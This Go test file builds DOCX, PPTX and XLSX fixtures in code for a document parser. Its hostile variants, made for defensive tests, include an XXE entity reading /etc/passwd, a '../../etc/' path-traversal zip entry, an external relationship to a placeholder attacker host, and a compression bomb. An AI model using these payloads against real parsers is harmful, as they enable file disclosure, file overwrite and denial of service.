package postgres_test

import (
	"archive/zip"
	"bytes"
	"testing"
)

// Deterministic OOXML fixtures, built here rather than committed as opaque binaries.
// Constructing the packages in code is what makes the hostile variants below
// possible at all: a macro part, an external relationship, a DTD, a traversal entry,
// a duplicate entry and a compression bomb cannot be produced by an office suite,
// and a committed blob could not be reviewed for what it actually contains.

const ooxmlXMLHead = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>`

// ooxmlCanary marks every carrier that must never be extracted or persisted.
const ooxmlCanary = "OOXMLCANARY"

type ooxmlPart struct {
	name string
	body []byte
}

// buildOOXML writes the parts in the given order, preserving duplicates and
// unsanitized names so a hostile package can be expressed exactly.
func buildOOXML(t *testing.T, parts []ooxmlPart) []byte {
	t.Helper()
	var buf bytes.Buffer
	writer := zip.NewWriter(&buf)
	for _, part := range parts {
		file, err := writer.CreateHeader(&zip.FileHeader{Name: part.name, Method: zip.Deflate})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := file.Write(part.body); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func ooxmlPart_(name, body string) ooxmlPart { return ooxmlPart{name: name, body: []byte(body)} }

// --- DOCX ---

const docxContentTypes = ooxmlXMLHead + `<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`

const docxRootRels = ooxmlXMLHead + `<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`

// docxBody carries prose, a table and Cyrillic text. The second paragraph is
// deliberately delivered in decomposed form so the stored Evidence proves the Go
// runtime canonicalized it — the worker never normalizes anything.
func docxBody() string {
	decomposed := string([]rune{'C', 'a', 'f', 'e', 0x0301, ' ', 'p', 'l', 'a', 'n'})
	return ooxmlXMLHead + `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body>
<w:p><w:r><w:t xml:space="preserve">Quarterly Report</w:t></w:r></w:p>
<w:p><w:r><w:t xml:space="preserve">` + decomposed + "</w:t></w:r></w:p>\n<w:p><w:r><w:t xml:space=\"preserve\">\u0412\u044b\u0440\u0443\u0447\u043a\u0430 \u0432\u044b\u0440\u043e\u0441\u043b\u0430 \u043d\u0430 12 \u043f\u0440\u043e\u0446\u0435\u043d\u0442\u043e\u0432.</w:t></w:r></w:p>\n<w:tbl><w:tr>\n<w:tc><w:p><w:r><w:t>Cell one</w:t></w:r></w:p></w:tc>\n<w:tc><w:p><w:r><w:t>Cell two</w:t></w:r></w:p></w:tc>\n</w:tr></w:tbl>\n</w:body></w:document>"
}

func validDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
	})
}

func emptyDOCX(t *testing.T) []byte {
	emptyBody := ooxmlXMLHead + `<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body></w:body></w:document>`
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", emptyBody),
	})
}

// --- Hostile OOXML variants (each carries the canary in its hostile part) ---

func macroDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		ooxmlPart_("word/vbaProject.bin", "macro payload "+ooxmlCanary),
	})
}

func oleDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		ooxmlPart_("word/embeddings/oleObject1.bin", "embedded object "+ooxmlCanary),
	})
}

func externalRelationshipDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		ooxmlPart_("word/_rels/document.xml.rels", ooxmlXMLHead+
			`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`+
			`<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"`+
			` Target="http://evil.example/`+ooxmlCanary+`" TargetMode="External"/></Relationships>`),
	})
}

func entityDOCX(t *testing.T) []byte {
	poisoned := ooxmlXMLHead +
		`<!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd"><!ENTITY c "` + ooxmlCanary + `">]>` +
		`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>` +
		`<w:p><w:r><w:t>&xxe;&c;</w:t></w:r></w:p></w:body></w:document>`
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", poisoned),
	})
}

func traversalDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		ooxmlPart_("../../etc/"+ooxmlCanary+".xml", "escaped "+ooxmlCanary),
	})
}

func duplicateEntryDOCX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		// A second document part: which one wins would otherwise be the reader's guess.
		ooxmlPart_("word/document.xml", ooxmlXMLHead+
			`<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>`+
			`<w:p><w:r><w:t>`+ooxmlCanary+`</w:t></w:r></w:p></w:body></w:document>`),
	})
}

func compressionBombDOCX(t *testing.T) []byte {
	bomb := make([]byte, 4<<20)
	copy(bomb, ooxmlCanary)
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", docxContentTypes),
		ooxmlPart_("_rels/.rels", docxRootRels),
		ooxmlPart_("word/document.xml", docxBody()),
		{name: "word/bomb.xml", body: bomb},
	})
}

// --- PPTX ---

func validPPTX(t *testing.T) []byte {
	const themeBody = ooxmlXMLHead + `<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="T"><a:themeElements>
<a:clrScheme name="C"><a:dk1><a:sysClr val="windowText" lastClr="000000"/></a:dk1><a:lt1><a:sysClr val="window" lastClr="FFFFFF"/></a:lt1><a:dk2><a:srgbClr val="000000"/></a:dk2><a:lt2><a:srgbClr val="FFFFFF"/></a:lt2><a:accent1><a:srgbClr val="000001"/></a:accent1><a:accent2><a:srgbClr val="000002"/></a:accent2><a:accent3><a:srgbClr val="000003"/></a:accent3><a:accent4><a:srgbClr val="000004"/></a:accent4><a:accent5><a:srgbClr val="000005"/></a:accent5><a:accent6><a:srgbClr val="000006"/></a:accent6><a:hlink><a:srgbClr val="000007"/></a:hlink><a:folHlink><a:srgbClr val="000008"/></a:folHlink></a:clrScheme>
<a:fontScheme name="F"><a:majorFont><a:latin typeface="Calibri"/><a:ea typeface=""/><a:cs typeface=""/></a:majorFont><a:minorFont><a:latin typeface="Calibri"/><a:ea typeface=""/><a:cs typeface=""/></a:minorFont></a:fontScheme>
<a:fmtScheme name="S"><a:fillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:fillStyleLst><a:lnStyleLst><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln><a:ln><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:ln></a:lnStyleLst><a:effectStyleLst><a:effectStyle><a:effectLst/></a:effectStyle><a:effectStyle><a:effectLst/></a:effectStyle><a:effectStyle><a:effectLst/></a:effectStyle></a:effectStyleLst><a:bgFillStyleLst><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill><a:solidFill><a:schemeClr val="phClr"/></a:solidFill></a:bgFillStyleLst></a:fmtScheme>
</a:themeElements></a:theme>`

	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", ooxmlXMLHead+`<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>
<Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
<Override PartName="/ppt/slideLayouts/slideLayout1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideLayout+xml"/>
<Override PartName="/ppt/slideMasters/slideMaster1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slideMaster+xml"/>
<Override PartName="/ppt/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/>
</Types>`),
		ooxmlPart_("_rels/.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
</Relationships>`),
		ooxmlPart_("ppt/_rels/presentation.xml.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="slideMasters/slideMaster1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="slides/slide1.xml"/>
</Relationships>`),
		ooxmlPart_("ppt/presentation.xml", ooxmlXMLHead+`<p:presentation xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldMasterIdLst><p:sldMasterId id="2147483648" r:id="rId1"/></p:sldMasterIdLst>
<p:sldIdLst><p:sldId id="256" r:id="rId2"/></p:sldIdLst>
<p:sldSz cx="9144000" cy="6858000"/><p:notesSz cx="6858000" cy="9144000"/>
</p:presentation>`),
		ooxmlPart_("ppt/slideMasters/_rels/slideMaster1.xml.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="../theme/theme1.xml"/>
</Relationships>`),
		ooxmlPart_("ppt/slideMasters/slideMaster1.xml", ooxmlXMLHead+`<p:sldMaster xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld>
<p:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
<p:sldLayoutIdLst><p:sldLayoutId id="2147483649" r:id="rId1"/></p:sldLayoutIdLst>
</p:sldMaster>`),
		ooxmlPart_("ppt/slideLayouts/_rels/slideLayout1.xml.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideMaster" Target="../slideMasters/slideMaster1.xml"/>
</Relationships>`),
		ooxmlPart_("ppt/slideLayouts/slideLayout1.xml", ooxmlXMLHead+`<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" type="blank">
<p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld>
</p:sldLayout>`),
		ooxmlPart_("ppt/theme/theme1.xml", themeBody),
		ooxmlPart_("ppt/slides/_rels/slide1.xml.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/>
</Relationships>`),
		ooxmlPart_("ppt/slides/slide1.xml", ooxmlXMLHead+`<p:sld xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld><p:spTree>
<p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/>
<p:sp><p:nvSpPr><p:cNvPr id="2" name="Title"/><p:cNvSpPr><a:spLocks noGrp="1"/></p:cNvSpPr><p:nvPr/></p:nvSpPr>
<p:spPr/><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:t>Roadmap</a:t></a:r></a:p></p:txBody></p:sp>
<p:sp><p:nvSpPr><p:cNvPr id="3" name="Body"/><p:cNvSpPr/><p:nvPr/></p:nvSpPr>
<p:spPr/><p:txBody><a:bodyPr/><a:lstStyle/><a:p><a:r><a:t>Ship the parser</a:t></a:r></a:p></p:txBody></p:sp>
</p:spTree></p:cSld></p:sld>`),
	})
}

// --- XLSX ---

func validXLSX(t *testing.T) []byte {
	return buildOOXML(t, []ooxmlPart{
		ooxmlPart_("[Content_Types].xml", ooxmlXMLHead+`<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/>
</Types>`),
		ooxmlPart_("_rels/.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>`),
		ooxmlPart_("xl/_rels/workbook.xml.rels", ooxmlXMLHead+`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
</Relationships>`),
		ooxmlPart_("xl/workbook.xml", ooxmlXMLHead+`<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Budget" sheetId="1" r:id="rId1"/></sheets></workbook>`),
		ooxmlPart_("xl/styles.xml", ooxmlXMLHead+`<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<fonts count="1"><font><sz val="11"/><name val="Calibri"/></font></fonts>
<fills count="1"><fill><patternFill patternType="none"/></fill></fills>
<borders count="1"><border/></borders>
<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>
<cellXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/></cellXfs>
</styleSheet>`),
		// B3 is a formula with a cached value: the parser must report the cached value
		// and never evaluate the formula.
		ooxmlPart_("xl/worksheets/sheet1.xml", ooxmlXMLHead+`<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData>
<row r="1"><c r="A1" t="inlineStr"><is><t>Region</t></is></c><c r="B1" t="inlineStr"><is><t>Amount</t></is></c></row>
<row r="2"><c r="A2" t="inlineStr"><is><t>North</t></is></c><c r="B2"><v>1200</v></c></row>
<row r="3"><c r="A3" t="inlineStr"><is><t>Total</t></is></c><c r="B3"><f>SUM(B2:B2)</f><v>1200</v></c></row>
</sheetData></worksheet>`),
	})
}
